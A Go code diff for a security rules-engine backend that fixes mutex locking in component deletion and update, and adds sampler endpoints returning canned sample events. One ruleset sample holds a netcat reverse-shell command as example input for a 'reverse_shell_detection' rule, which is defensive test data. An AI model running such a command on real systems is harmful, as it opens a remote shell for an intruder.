@@ -14,6 +14,7 @@ import (
 	"os"
 	"path"
 	"strings"
+	"time"
 
 	"github.com/labstack/echo/v4"
 )
@@ -658,13 +659,11 @@ func deleteComponent(componentType string, c echo.Context) error {
 	tempPath, tempExists := GetComponentPath(componentType, id, true)         // .new file
 	componentPath, formalExists := GetComponentPath(componentType, id, false) // formal file
 
-	// Lock for all memory operations
-	common.GlobalMu.Lock()
-	defer common.GlobalMu.Unlock()
-
-	// Check if component exists
+	// Check if component exists and perform memory operations
 	var componentExists bool
 	var globalMapToUpdate map[string]string
+
+	common.GlobalMu.Lock()
 
 	// Get corresponding global mapping based on component type
 	switch componentType {
@@ -684,6 +683,7 @@ func deleteComponent(componentType string, c echo.Context) error {
 		_, componentExists = plugin.Plugins[id]
 		globalMapToUpdate = common.AllPluginsRawConfig
 	default:
+		common.GlobalMu.Unlock()
 		return c.JSON(http.StatusBadRequest, map[string]string{"error": "unknown component type"})
 	}
 
@@ -702,6 +702,7 @@ func deleteComponent(componentType string, c echo.Context) error {
 				_, inUse = p.Outputs[id]
 			}
 			if inUse {
+				common.GlobalMu.Unlock()
 				return c.JSON(http.StatusConflict, map[string]string{
 					"error": fmt.Sprintf("%s is currently in use by project %s", id, p.Id),
 				})
@@ -742,7 +743,6 @@ func deleteComponent(componentType string, c echo.Context) error {
 		delete(globalMapToUpdate, id)
 	}
 
-	// Unlock before file operations to avoid holding lock during I/O
 	common.GlobalMu.Unlock()
 
 	// If it's leader node, delete files and notify followers
@@ -763,9 +763,6 @@ func deleteComponent(componentType string, c echo.Context) error {
 			go syncToFollowers("DELETE", "/"+componentType+"/"+id, nil)
 		}
 	}
-
-	// Re-acquire lock to ensure consistent return
-	common.GlobalMu.Lock()
 
 	return c.JSON(http.StatusOK, map[string]string{
 		"message": fmt.Sprintf("%s deleted successfully", componentType),
@@ -857,7 +854,8 @@ func updateComponent(componentType string, c echo.Context) error {
 		tempPath, tempExists := GetComponentPath(componentType, id, true)
 		if tempExists {
 			_ = os.Remove(tempPath)
-			// Also remove from memory
+			// Also remove from memory with lock protection
+			common.GlobalMu.Lock()
 			switch componentType {
 			case "input":
 				delete(project.GlobalProject.InputsNew, id)
@@ -870,6 +868,7 @@ func updateComponent(componentType string, c echo.Context) error {
 			case "plugin":
 				delete(plugin.PluginsNew, id)
 			}
+			common.GlobalMu.Unlock()
 		}
 		return c.JSON(http.StatusOK, map[string]string{"message": "content identical to original file, no changes needed"})
 	}
@@ -1041,4 +1040,226 @@ func cancelPluginUpgrade(c echo.Context) error {
 		_ = os.Remove(tempPath)
 	}
 	return c.JSON(http.StatusOK, map[string]string{"message": "plugin upgrade cancelled"})
+}
+
+// GetSamplerData retrieves sample data from project components
+func GetSamplerData(c echo.Context) error {
+	componentName := c.QueryParam("name")               // e.g., "input", "output", "ruleset"
+	nodeSequence := c.QueryParam("projectNodeSequence") // e.g., "input.kafka1", "ruleset.rule1"
+
+	if componentName == "" || nodeSequence == "" {
+		return c.JSON(http.StatusBadRequest, map[string]string{
+			"error": "Missing required parameters: name and projectNodeSequence",
+		})
+	}
+
+	// Parse node sequence to get component type and ID
+	parts := strings.Split(nodeSequence, ".")
+	if len(parts) < 2 {
+		return c.JSON(http.StatusBadRequest, map[string]string{
+			"error": "Invalid projectNodeSequence format, expected 'type.id'",
+		})
+	}
+
+	componentType := parts[0]
+	componentId := strings.Join(parts[1:], ".")
+
+	// Initialize response structure
+	response := map[string]interface{}{
+		componentName: map[string]interface{}{
+			nodeSequence: []interface{}{},
+		},
+	}
+
+	// Get sample data based on component type
+	switch componentType {
+	case "input":
+		if input := project.GlobalProject.Inputs[componentId]; input != nil {
+			// For inputs, we can provide sample data based on the input type
+			sampleData := generateInputSampleData(input)
+			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+		}
+	case "output":
+		if output := project.GlobalProject.Outputs[componentId]; output != nil {
+			// For outputs, provide sample data that would be sent
+			sampleData := generateOutputSampleData(output)
+			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+		}
+	case "ruleset":
+		if ruleset := project.GlobalProject.Rulesets[componentId]; ruleset != nil {
+			// For rulesets, provide sample data that would trigger rules
+			sampleData := generateRulesetSampleData(ruleset)
+			response[componentName].(map[string]interface{})[nodeSequence] = sampleData
+		}
+	default:
+		return c.JSON(http.StatusBadRequest, map[string]string{
+			"error": "Unsupported component type: " + componentType,
+		})
+	}
+
+	return c.JSON(http.StatusOK, response)
+}
+
+// GetSamplerStats retrieves sampler statistics
+func GetSamplerStats(c echo.Context) error {
+	stats := map[string]interface{}{
+		"total_samples":   0,
+		"active_samplers": 0,
+		"components": map[string]interface{}{
+			"inputs":   len(project.GlobalProject.Inputs),
+			"outputs":  len(project.GlobalProject.Outputs),
+			"rulesets": len(project.GlobalProject.Rulesets),
+		},
+		"last_updated": time.Now().Format(time.RFC3339),
+	}
+
+	// Count active components
+	activeCount := 0
+	for _, proj := range project.GlobalProject.Projects {
+		if proj.Status == project.ProjectStatusRunning {
+			activeCount += len(proj.Inputs) + len(proj.Outputs) + len(proj.Rulesets)
+		}
+	}
+	stats["active_samplers"] = activeCount
+
+	return c.JSON(http.StatusOK, map[string]interface{}{
+		"status": "success",
+		"stats":  stats,
+	})
+}
+
+// ResetSampler resets sampler data (placeholder for future implementation)
+func ResetSampler(c echo.Context) error {
+	// In a real implementation, this might clear cached sample data
+	// For now, just return success
+	return c.JSON(http.StatusOK, map[string]interface{}{
+		"status":    "success",
+		"message":   "Sampler data reset successfully",
+		"timestamp": time.Now().Format(time.RFC3339),
+	})
+}
+
+// Helper function to generate sample data for inputs
+func generateInputSampleData(input *input.Input) []interface{} {
+	samples := make([]interface{}, 0)
+
+	switch input.Type {
+	case "kafka":
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"message":   "Sample Kafka message",
+			"topic":     input.Config.Kafka.Topic,
+			"partition": 0,
+			"offset":    12345,
+			"key":       "sample-key",
+			"value": map[string]interface{}{
+				"user_id":   "user123",
+				"action":    "login",
+				"ip":        "192.168.1.100",
+				"timestamp": time.Now().Unix(),
+			},
+		})
+	case "aliyun_sls":
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"project":   input.Config.AliyunSLS.Project,
+			"logstore":  input.Config.AliyunSLS.Logstore,
+			"source":    "sample-source",
+			"topic":     "sample-topic",
+			"content": map[string]interface{}{
+				"level":   "INFO",
+				"message": "Sample SLS log message",
+				"module":  "auth",
+				"user":    "user123",
+			},
+		})
+	default:
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"type":      "sample",
+			"data":      "Sample input data",
+		})
+	}
+
+	return samples
+}
+
+// Helper function to generate sample data for outputs
+func generateOutputSampleData(output *output.Output) []interface{} {
+	samples := make([]interface{}, 0)
+
+	switch output.Type {
+	case "kafka":
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"topic":     output.Config.Kafka.Topic,
+			"message": map[string]interface{}{
+				"alert_id":    "alert123",
+				"severity":    "high",
+				"description": "Sample security alert",
+				"source_ip":   "192.168.1.100",
+				"detected_at": time.Now().Unix(),
+			},
+		})
+	case "elasticsearch":
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"index":     output.Config.Elasticsearch.Index,
+			"document": map[string]interface{}{
+				"@timestamp":  time.Now().Format(time.RFC3339),
+				"event_type":  "security_alert",
+				"severity":    "medium",
+				"description": "Sample ES document",
+			},
+		})
+	case "print":
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"output":    "Sample print output",
+			"level":     "INFO",
+		})
+	default:
+		samples = append(samples, map[string]interface{}{
+			"timestamp": time.Now().Format(time.RFC3339),
+			"data":      "Sample output data",
+		})
+	}
+
+	return samples
+}
+
+// Helper function to generate sample data for rulesets
+func generateRulesetSampleData(ruleset *rules_engine.Ruleset) []interface{} {
+	samples := make([]interface{}, 0)
+
+	// Generate sample data that would trigger rules
+	samples = append(samples, map[string]interface{}{
+		"timestamp": time.Now().Format(time.RFC3339),
+		"rule_type": "detection",
+		"input_data": map[string]interface{}{
+			"command":   "/bin/bash",
+			"args":      []string{"-c", "nc -e /bin/sh 192.168.1.1 4444"},
+			"user":      "www-data",
+			"pid":       1234,
+			"source_ip": "192.168.1.100",
+		},
+		"matched_rules": []string{"reverse_shell_detection"},
+		"severity":      "high",
+	})
+
+	samples = append(samples, map[string]interface{}{
+		"timestamp": time.Now().Add(-1 * time.Minute).Format(time.RFC3339),
+		"rule_type": "classification",
+		"input_data": map[string]interface{}{
+			"http_method": "POST",
+			"url":         "/admin/login",
+			"status_code": 401,
+			"user_agent":  "curl/7.68.0",
+			"source_ip":   "192.168.1.200",
+		},
+		"classification": "suspicious_login_attempt",
+		"confidence":     0.85,
+	})
+
+	return samples
 }
